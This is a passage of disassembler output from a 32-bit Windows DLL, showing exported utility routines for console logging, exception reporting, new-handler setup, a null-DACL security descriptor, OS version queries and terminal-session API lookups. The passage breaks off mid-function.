		push	offset aCmulticonsol_0 ; "CMultiConsole::Add() : pos !=	m_WindowM"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF4619A
; ---------------------------------------------------------------------------

loc_6AF46162:				; CODE XREF: Ordinal903+52j
		push	offset aCmulticonsol_1 ; "CMultiConsole::Add()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		lea	eax, [ebp+arg_0]
		push	eax
		mov	ecx, edi
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF46067
		mov	ecx, [ebp+arg_4]
		mov	[eax], ecx

loc_6AF46183:				; DATA XREF: sub_6AF461BD+3Do
					; sub_6AF46200+4Fo
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_48]
		inc	esi
		call	Ordinal752

loc_6AF4619A:				; CODE XREF: Ordinal903+61j
		lea	ecx, [ebp+var_58]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal903	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF461BD	proc near		; DATA XREF: .rdata:6AF638C4o
		push	13h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	ecx, [ebp-28h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF46183
		retn
sub_6AF461BD	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF46200	proc near		; DATA XREF: .rdata:6AF638D4o
		push	15h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	eax, [ebp-4Ch]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF46183
		retn
sub_6AF46200	endp

; Exported entry 906.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal906
Ordinal906	proc near		; CODE XREF: Ordinal548+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		xor	ecx, ecx
		mov	dword ptr [eax], offset	off_6AF5CEB4
		mov	[eax+4], ecx
		mov	[eax+8], ecx
		mov	[eax+0Ch], ecx
		mov	[eax+10h], ecx
		mov	dword_6AF6825C,	eax
		retn
Ordinal906	endp

; Exported entry 909.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal909
Ordinal909	proc near		; CODE XREF: Ordinal563+1Bp
					; Ordinal907+6p ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+10h], 0
		jz	short loc_6AF46296
		push	dword ptr [esi+4]
		call	ds:?_set_new_handler@@YAP6AHI@ZP6AHI@Z@Z ; _set_new_handler(int	(*)(uint))
		push	dword ptr [esi+8]
		and	dword ptr [esi+4], 0
		call	ds:?_set_new_mode@@YAHH@Z ; _set_new_mode(int)
		and	dword ptr [esi+8], 0
		pop	ecx
		pop	ecx

loc_6AF46296:				; CODE XREF: Ordinal909+7j
		and	dword ptr [esi+10h], 0
		pop	esi
		retn
Ordinal909	endp

; Exported entry 912.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal912
Ordinal912	proc near		; CODE XREF: Ordinal570+1Ep
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+0Ch], eax
		retn	4
Ordinal912	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF462A6	proc near		; DATA XREF: Ordinal908+8o

arg_0		= dword	ptr  4

		mov	ecx, dword_6AF6825C
		test	ecx, ecx
		jz	short loc_6AF462BA
		push	[esp+arg_0]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		retn
; ---------------------------------------------------------------------------

loc_6AF462BA:				; CODE XREF: sub_6AF462A6+8j
		xor	eax, eax
		retn
sub_6AF462A6	endp

; Exported entry 907.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal907
Ordinal907	proc near		; CODE XREF: Ordinal549+6j
					; sub_6AF4632C+3p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5CEB4
		call	Ordinal909
		and	dword_6AF6825C,	0
		retn
Ordinal907	endp

; Exported entry 908.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal908
Ordinal908	proc near		; CODE XREF: Ordinal562+1D3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal909
		push	offset sub_6AF462A6
		call	ds:?_set_new_handler@@YAP6AHI@ZP6AHI@Z@Z ; _set_new_handler(int	(*)(uint))
		push	1
		mov	[esi+4], eax
		call	ds:?_set_new_mode@@YAHH@Z ; _set_new_mode(int)
		pop	ecx
		mov	[esi+8], eax
		pop	ecx
		xor	eax, eax
		mov	dword ptr [esi+10h], 1
		inc	eax
		pop	esi
		retn
Ordinal908	endp

; Exported entry 910.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal910
Ordinal910	proc near		; CODE XREF: Ordinal550+25p
					; DATA XREF: .rdata:6AF5CEB8o ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		cmp	dword ptr [ecx+0Ch], 0
		jz	short loc_6AF46326
		push	offset aBadAllocation ;	"bad allocation"
		lea	ecx, [ebp+var_C]
		call	sub_6AF44FFF
		push	offset dword_6AF63790
		lea	eax, [ebp+var_C]
		push	eax
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF46326:				; CODE XREF: Ordinal910+Aj
		xor	eax, eax
		leave
		retn	4
Ordinal910	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4632C(void *, char)
sub_6AF4632C	proc near		; DATA XREF: .rdata:off_6AF5CEB4o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal907
		test	[esp+4+arg_0], 1
		jz	short loc_6AF46342
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF46342:				; CODE XREF: sub_6AF4632C+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4632C	endp

; Exported entry 914.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal914
Ordinal914	proc near		; CODE XREF: Ordinal1074+18Dp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		push	edi
		mov	esi, ecx
		and	dword ptr [esi+10h], 0
		and	dword ptr [esi+28h], 0
		push	0Ch		; Size
		lea	edi, [esi+4]
		push	0		; Val
		push	edi		; Dst
		mov	dword ptr [esi], offset	off_6AF5CEBC
		call	memset
		push	14h		; Size
		lea	eax, [esi+14h]
		push	0		; Val
		push	eax		; Dst
		mov	dword ptr [edi], 0Ch
		call	memset
		add	esp, 18h
		pop	edi
		mov	eax, esi
		pop	esi
		retn
Ordinal914	endp

; Exported entry 918.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal918
Ordinal918	proc near		; CODE XREF: Ordinal1074+19Cp
					; DATA XREF: .rdata:off_6AF66098o

var_108		= byte ptr -108h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+10h], 0
		and	dword ptr [esi+28h], 0
		lea	ecx, [ebp+var_108]
		mov	[ebp+var_4], eax
		call	Ordinal932
		lea	ecx, [ebp+var_108]
		call	Ordinal934
		test	eax, eax
		jz	short loc_6AF463BD
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF46413
; ---------------------------------------------------------------------------

loc_6AF463BD:				; CODE XREF: Ordinal918+34j
		push	ebx
		push	edi
		xor	eax, eax
		inc	eax
		lea	edi, [esi+14h]
		push	eax		; dwRevision
		lea	ebx, [esi+4]
		push	edi		; pSecurityDescriptor
		mov	dword ptr [ebx], 0Ch
		mov	[esi+0Ch], eax
		mov	[esi+8], edi
		call	InitializeSecurityDescriptor
		test	eax, eax
		jz	short loc_6AF463FC
		push	0		; bDaclDefaulted
		push	0		; pDacl
		push	1		; bDaclPresent
		push	edi		; pSecurityDescriptor
		call	SetSecurityDescriptorDacl
		test	eax, eax
		jz	short loc_6AF463FC
		mov	[esi+10h], ebx
		mov	[esi+28h], edi
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF46411
; ---------------------------------------------------------------------------

loc_6AF463FC:				; CODE XREF: Ordinal918+5Cj
					; Ordinal918+6Dj
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCnulldaclCreat ; "CNullDacl::Create() :	InitializeSecurit"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	esi, esi

loc_6AF46411:				; CODE XREF: Ordinal918+78j
		pop	edi
		pop	ebx

loc_6AF46413:				; CODE XREF: Ordinal918+39j
		lea	ecx, [ebp+var_108]
		call	Ordinal933
		mov	ecx, [ebp+var_4]
		mov	eax, esi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
Ordinal918	endp

; Exported entry 919.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal919
Ordinal919	proc near		; CODE XREF: Ordinal915+6j
					; sub_6AF46468+9p
					; DATA XREF: ...
		push	esi
		push	edi
		mov	esi, ecx
		and	dword ptr [esi+28h], 0
		and	dword ptr [esi+10h], 0
		push	0Ch		; Size
		lea	edi, [esi+4]
		push	0		; Val
		push	edi		; Dst
		call	memset
		push	14h		; Size
		push	0		; Val
		add	esi, 14h
		push	esi		; Dst
		mov	dword ptr [edi], 0Ch
		call	memset
		add	esp, 18h
		pop	edi
		pop	esi
		retn
Ordinal919	endp

; Exported entry 915.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal915
Ordinal915	proc near		; CODE XREF: Ordinal1074+68Dp
					; sub_6AF534A1+6j
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5CEBC
		jmp	Ordinal919
Ordinal915	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF46468(void *, char)
sub_6AF46468	proc near		; DATA XREF: .rdata:off_6AF5CEBCo

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5CEBC
		call	Ordinal919
		test	[esp+4+arg_0], 1
		jz	short loc_6AF46484
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF46484:				; CODE XREF: sub_6AF46468+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF46468	endp

; Exported entry 921.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal921
Ordinal921	proc near		; CODE XREF: Ordinal933+1Bj
					; sub_6AF4663D+3p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5CF08
		jmp	Ordinal891
Ordinal921	endp

; Exported entry 925.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal925
Ordinal925	proc near		; CODE XREF: Ordinal920+12p
					; Ordinal924+5p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	ebx
		xor	ebx, ebx
		cmp	[esp+4+arg_0], ebx
		push	esi
		mov	esi, ecx
		jz	short loc_6AF464AA
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF46501

loc_6AF464AA:				; CODE XREF: Ordinal925+Aj
		push	edi
		xor	edi, edi
		inc	edi
		cmp	[esp+0Ch+arg_0], ebx
		jnz	short loc_6AF464BF
		mov	[esi+8], ebx
		mov	[esi+0Ch], ebx
		mov	[esi+10h], ebx
		jmp	short loc_6AF464FE
; ---------------------------------------------------------------------------

loc_6AF464BF:				; CODE XREF: Ordinal925+1Dj
		push	offset aVersetconditio ; "VerSetConditionMask"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, ebx
		mov	[esi+8], eax
		jnz	short loc_6AF464D4
		xor	edi, edi

loc_6AF464D4:				; CODE XREF: Ordinal925+3Bj
		push	offset aVerifyversioni ; "VerifyVersionInfoA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, ebx
		mov	[esi+0Ch], eax
		jnz	short loc_6AF464E9
		xor	edi, edi

loc_6AF464E9:				; CODE XREF: Ordinal925+50j
		push	offset aVerifyversio_0 ; "VerifyVersionInfoW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, ebx
		mov	[esi+10h], eax
		jnz	short loc_6AF464FE
		xor	edi, edi

loc_6AF464FE:				; CODE XREF: Ordinal925+28j
					; Ordinal925+65j
		mov	eax, edi
		pop	edi

loc_6AF46501:				; CODE XREF: Ordinal925+13j
		pop	esi
		pop	ebx
		retn	4
Ordinal925	endp

; Exported entry 927.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal927
Ordinal927	proc near		; CODE XREF: Ordinal933+Fp
					; sub_6AF4675C+3p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5CF48
		jmp	Ordinal891
Ordinal927	endp

; Exported entry 931.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal931
Ordinal931	proc near		; CODE XREF: Ordinal926+12p
					; Ordinal930+5p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	ebx
		xor	ebx, ebx
		cmp	[esp+4+arg_0], ebx
		push	esi
		mov	esi, ecx
		jz	short loc_6AF46526
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4657D

loc_6AF46526:				; CODE XREF: Ordinal931+Aj
		push	edi
		xor	edi, edi
		inc	edi
		cmp	[esp+0Ch+arg_0], ebx
		jnz	short loc_6AF4653B
		mov	[esi+8], ebx
		mov	[esi+0Ch], ebx
		mov	[esi+10h], ebx
		jmp	short loc_6AF4657A
; ---------------------------------------------------------------------------

loc_6AF4653B:				; CODE XREF: Ordinal931+1Dj
		push	offset aWtsquerysessio ; "WTSQuerySessionInformationA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, ebx
		mov	[esi+8], eax
		jnz	short loc_6AF46550
		xor	edi, edi

loc_6AF46550:				; CODE XREF: Ordinal931+3Bj
		push	offset aWtsquerysess_0 ; "WTSQuerySessionInformationW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, ebx
		mov	[esi+0Ch], eax
		jnz	short loc_6AF46565
		xor	edi, edi

loc_6AF46565:				; CODE XREF: Ordinal931+50j
		push	offset aWtsfreememory ;	"WTSFreeMemory"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, ebx
		mov	[esi+10h], eax
		jnz	short loc_6AF4657A
		xor	edi, edi

loc_6AF4657A:				; CODE XREF: Ordinal931+28j
					; Ordinal931+65j
		mov	eax, edi
		pop	edi

loc_6AF4657D:				; CODE XREF: Ordinal931+13j
		pop	esi
		pop	ebx
		retn	4
Ordinal931	endp

; Exported entry 933.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal933
Ordinal933	proc near		; CODE XREF: Ordinal306+1D8p
					; Ordinal623+12Ep ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+0F0h]
		mov	dword ptr [esi], offset	off_6AF5CF94
		call	Ordinal927
		lea	ecx, [esi+0DCh]
		pop	esi
		jmp	Ordinal921
Ordinal933	endp

; Exported entry 934.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal934
Ordinal934	proc near		; CODE XREF: Ordinal306+30p
					; Ordinal918+2Dp
					; DATA XREF: ...
		xor	eax, eax
		cmp	dword ptr [ecx+14h], 1
		setz	al
		retn
Ordinal934	endp

; Exported entry 941.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal941
Ordinal941	proc near		; CODE XREF: Ordinal623+3Fp
					; Ordinal940+28p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		cmp	dword ptr [ecx+14h], 1
		jnz	short loc_6AF465D4
		mov	eax, [ecx+8]
		cmp	eax, 4
		jnz	short loc_6AF465C0
		cmp	dword ptr [ecx+0Ch], 5Ah
		jz	short loc_6AF465D8

loc_6AF465C0:				; CODE XREF: Ordinal941+Cj
		cmp	[esp+arg_0], 0
		jz	short loc_6AF465D4
		cmp	eax, 4
		ja	short loc_6AF465D8
		jnz	short loc_6AF465D4
		cmp	dword ptr [ecx+0Ch], 5Ah
		ja	short loc_6AF465D8

loc_6AF465D4:				; CODE XREF: Ordinal941+4j
					; Ordinal941+19j ...
		xor	eax, eax
		jmp	short locret_6AF465DB
; ---------------------------------------------------------------------------

loc_6AF465D8:				; CODE XREF: Ordinal941+12j
					; Ordinal941+1Ej ...
		xor	eax, eax
		inc	eax

locret_6AF465DB:			; CODE XREF: Ordinal941+2Aj
		retn	4
Ordinal941	endp

; Exported entry 942.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal942
Ordinal942	proc near		; CODE XREF: Ordinal470+6p
					; Ordinal472+6p ...
		xor	eax, eax
		cmp	dword ptr [ecx+14h], 2
		setz	al
		retn
Ordinal942	endp

; Exported entry 946.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal946
Ordinal946	proc near		; CODE XREF: Ordinal945+24p
					; Ordinal953+27p ...

arg_0		= dword	ptr  4

		xor	eax, eax
		cmp	dword ptr [ecx+14h], 2
		jnz	short locret_6AF46613
		mov	edx, [ecx+8]
		inc	eax
		cmp	edx, 5
		jnz	short loc_6AF465FE
		cmp	[ecx+0Ch], eax
		jz	short locret_6AF46613

loc_6AF465FE:				; CODE XREF: Ordinal946+Fj
		cmp	[esp+arg_0], 0
		jz	short loc_6AF46611
		cmp	edx, 5
		ja	short locret_6AF46613
		jnz	short loc_6AF46611
		cmp	[ecx+0Ch], eax
		ja	short locret_6AF46613

loc_6AF46611:				; CODE XREF: Ordinal946+1Bj
					; Ordinal946+22j
		xor	eax, eax

locret_6AF46613:			; CODE XREF: Ordinal946+6j
					; Ordinal946+14j ...
		retn	4
Ordinal946	endp

; Exported entry 949.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal949
Ordinal949	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	1000h		; nIndex
		call	ds:GetSystemMetrics
		retn
Ordinal949	endp

; Exported entry 920.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal920
Ordinal920	proc near		; CODE XREF: Ordinal932+43p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		push	0
		mov	ecx, esi
		mov	dword ptr [esi], offset	off_6AF5CF08
		call	Ordinal925
		mov	eax, esi
		pop	esi
		retn
Ordinal920	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4663D(void *, char)
sub_6AF4663D	proc near		; DATA XREF: .rdata:off_6AF5CF08o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal921
		test	[esp+4+arg_0], 1
		jz	short loc_6AF46653
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF46653:				; CODE XREF: sub_6AF4663D+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4663D	endp

; Exported entry 922.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal922(LPCSTR Args)
		public Ordinal922
Ordinal922	proc near		; CODE XREF: Ordinal952+1Fp
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4

		push	esi
		push	[esp+4+Args]	; Args
		mov	esi, ecx
		call	Ordinal896
		test	eax, eax
		jz	short loc_6AF46674
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF46678

loc_6AF46674:				; CODE XREF: Ordinal922+Ej
		xor	eax, eax
		jmp	short loc_6AF466BE
; ---------------------------------------------------------------------------

loc_6AF46678:				; CODE XREF: Ordinal922+19j
		push	edi
		xor	edi, edi
		push	offset aVersetconditio ; "VerSetConditionMask"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF46691
		xor	edi, edi

loc_6AF46691:				; CODE XREF: Ordinal922+34j
		push	offset aVerifyversioni ; "VerifyVersionInfoA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF466A6
		xor	edi, edi

loc_6AF466A6:				; CODE XREF: Ordinal922+49j
		push	offset aVerifyversio_0 ; "VerifyVersionInfoW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+10h], eax
		jnz	short loc_6AF466BB
		xor	edi, edi

loc_6AF466BB:				; CODE XREF: Ordinal922+5Ej
		mov	eax, edi
		pop	edi

loc_6AF466BE:				; CODE XREF: Ordinal922+1Dj
		pop	esi
		retn	4
Ordinal922	endp

; Exported entry 923.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal923(LPCSTR Args,	DWORD dwFlags)
		public Ordinal923
Ordinal923	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi
		push	[esp+4+dwFlags]	; dwFlags
		mov	esi, ecx
		push	[esp+8+Args]	; Args
		call	Ordinal897
		test	eax, eax
		jz	short loc_6AF466E1
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF466E5

loc_6AF466E1:				; CODE XREF: Ordinal923+12j
		xor	eax, eax
		jmp	short loc_6AF4672B
; ---------------------------------------------------------------------------

loc_6AF466E5:				; CODE XREF: Ordinal923+1Dj
		push	edi
		xor	edi, edi
		push	offset aVersetconditio ; "VerSetConditionMask"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF466FE
		xor	edi, edi

loc_6AF466FE:				; CODE XREF: Ordinal923+38j
		push	offset aVerifyversioni ; "VerifyVersionInfoA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF46713
		xor	edi, edi

loc_6AF46713:				; CODE XREF: Ordinal923+4Dj
		push	offset aVerifyversio_0 ; "VerifyVersionInfoW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+10h], eax
		jnz	short loc_6AF46728
		xor	edi, edi

loc_6AF46728:				; CODE XREF: Ordinal923+62j
		mov	eax, edi
		pop	edi

loc_6AF4672B:				; CODE XREF: Ordinal923+21j
		pop	esi
		retn	8
Ordinal923	endp

; Exported entry 924.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal924
Ordinal924	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		push	0
		mov	esi, ecx
		call	Ordinal925
		mov	ecx, esi
		pop	esi
		jmp	Ordinal898
Ordinal924	endp

; Exported entry 926.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal926
Ordinal926	proc near		; CODE XREF: Ordinal932+4Ep
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		push	0
		mov	ecx, esi
		mov	dword ptr [esi], offset	off_6AF5CF48
		call	Ordinal931
		mov	eax, esi
		pop	esi
		retn
Ordinal926	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4675C(void *, char)
sub_6AF4675C	proc near		; DATA XREF: .rdata:off_6AF5CF48o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal927
		test	[esp+4+arg_0], 1
		jz	short loc_6AF46772
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF46772:				; CODE XREF: sub_6AF4675C+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4675C	endp

; Exported entry 928.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal928(LPCSTR Args)
		public Ordinal928
Ordinal928	proc near		; CODE XREF: Ordinal952+3Ep
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4

		push	esi
		push	[esp+4+Args]	; Args
		mov	esi, ecx
		call	Ordinal896
		test	eax, eax
		jz	short loc_6AF46793
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF46797

loc_6AF46793:				; CODE XREF: Ordinal928+Ej
		xor	eax, eax
		jmp	short loc_6AF467DD
; ---------------------------------------------------------------------------

loc_6AF46797:				; CODE XREF: Ordinal928+19j
		push	edi
		xor	edi, edi
		push	offset aWtsquerysessio ; "WTSQuerySessionInformationA"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF467B0
		xor	edi, edi

loc_6AF467B0:				; CODE XREF: Ordinal928+34j
		push	offset aWtsquerysess_0 ; "WTSQuerySessionInformationW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF467C5
		xor	edi, edi

loc_6AF467C5:				; CODE XREF: Ordinal928+49j
		push	offset aWtsfreememory ;	"WTSFreeMemory"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+10h], eax
		jnz	short loc_6AF467DA
		xor	edi, edi

loc_6AF467DA:				; CODE XREF: Ordinal928+5Ej
		mov	eax, edi
		pop	edi

loc_6AF467DD:				; CODE XREF: Ordinal928+1Dj
		pop	esi
		retn	4
Ordinal928	endp

; Exported entry 929.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal929(LPCSTR Args,	DWORD dwFlags)
		public Ordinal929
Ordinal929	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi
		push	[esp+4+dwFlags]	; dwFlags
		mov	esi, ecx
		push	[esp+8+Args]	; Args
		call	Ordinal897
		test	eax, eax
		jz	short loc_6AF46800
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF46804

loc_6AF46800:				; CODE XREF: Ordinal929+12j
		xor	eax, eax
		jmp	short loc_6AF4684A
; ---------------------------------------------------------------------------

loc_6AF46804:				; CODE XREF: Ordinal929+1Dj
		push	edi
		xor	edi, edi
		push	offset aWtsquerysessio ; "WTSQuerySessionInformationA"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF4681D
		xor	edi, edi

loc_6AF4681D:				; CODE XREF: Ordinal929+38j
		push	offset aWtsquerysess_0 ; "WTSQuerySessionInformationW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF46832
		xor	edi, edi

loc_6AF46832:				; CODE XREF: Ordinal929+4Dj
		push	offset aWtsfreememory ;	"WTSFreeMemory"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+10h], eax
		jnz	short loc_6AF46847
		xor	edi, edi

loc_6AF46847:				; CODE XREF: Ordinal929+62j
		mov	eax, edi
		pop	edi

loc_6AF4684A:				; CODE XREF: Ordinal929+21j
		pop	esi
		retn	8
Ordinal929	endp

; Exported entry 930.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal930
Ordinal930	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		push	0
		mov	esi, ecx
		call	Ordinal931
		mov	ecx, esi
		pop	esi
		jmp	Ordinal898
Ordinal930	endp

; Exported entry 932.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal932
Ordinal932	proc near		; CODE XREF: Ordinal306+28p
					; Ordinal623+30p ...
		push	ebx
		xor	ebx, ebx
		push	esi
		mov	esi, ecx
		push	edi
		lea	ecx, [esi+0DCh]
		mov	dword ptr [esi], offset	off_6AF5CF94
		mov	[esi+0BCh], ebx
		mov	[esi+0C0h], ebx
		mov	[esi+0C4h], ebx
		mov	[esi+0C8h], ebx
		mov	[esi+0CCh], ebx
		mov	[esi+0D0h], ebx
		mov	[esi+0D4h], ebx
		mov	[esi+0D8h], ebx
		call	Ordinal920
		lea	ecx, [esi+0F0h]
		call	Ordinal926
		push	94h		; Size
		lea	edi, [esi+4]
		push	ebx		; Val
		push	edi		; Dst
		call	memset
		add	esp, 0Ch
		push	edi		; lpVersionInformation
		mov	dword ptr [edi], 94h
		call	ds:GetVersionExA
		test	eax, eax
		jnz	short loc_6AF468EF
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCosinfoCosinfo ; "COSInfo::COSInfo() : GetVersionEx() == "...
		mov	[esi+0D4h], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF468EF:				; CODE XREF: Ordinal932+74j
		push	24h		; Size
		lea	edi, [esi+98h]
		push	ebx		; Val
		push	edi		; Dst
		call	memset
		add	esp, 0Ch
		push	edi		; lpSystemInfo
		call	ds:GetSystemInfo
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		retn
Ordinal932	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4690E(void *, char)
sub_6AF4690E	proc near		; DATA XREF: .rdata:off_6AF5CF94o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal933
		test	[esp+4+arg_0], 1
		jz	short loc_6AF46924
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
